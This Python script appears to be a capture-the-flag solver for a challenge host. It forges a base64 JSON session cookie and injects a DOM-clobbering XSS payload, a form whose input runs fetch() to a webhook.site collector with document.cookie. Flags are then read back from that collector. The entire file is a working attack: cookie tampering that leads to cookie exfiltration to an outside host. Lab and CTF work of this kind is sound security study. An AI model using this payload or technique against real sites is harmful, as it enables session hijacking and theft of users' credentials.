import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

import base64
import json

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def main(self):
        URL = "https://clobber.quoccacorp.com"

        response = self.session.get(URL)
        cookie_key_name = list(response.cookies.keys())[0] # Name: session
        original_session_cookie = response.cookies.get(cookie_key_name)

        decoded_session_cookie = base64.b64decode(original_session_cookie).decode()
        decoded_json = json.loads(decoded_session_cookie)

        del decoded_json["username"]
        decoded_json["clicks"] = f'''<form id=configuration><input name=errorMsg value='fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)'></form>'''

        new_session_cookie = base64.b64encode(json.dumps(decoded_json).encode()).decode()

        self.session.cookies.clear()
        self.session.cookies.set(cookie_key_name, new_session_cookie)

        response = self.session.post(URL)
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()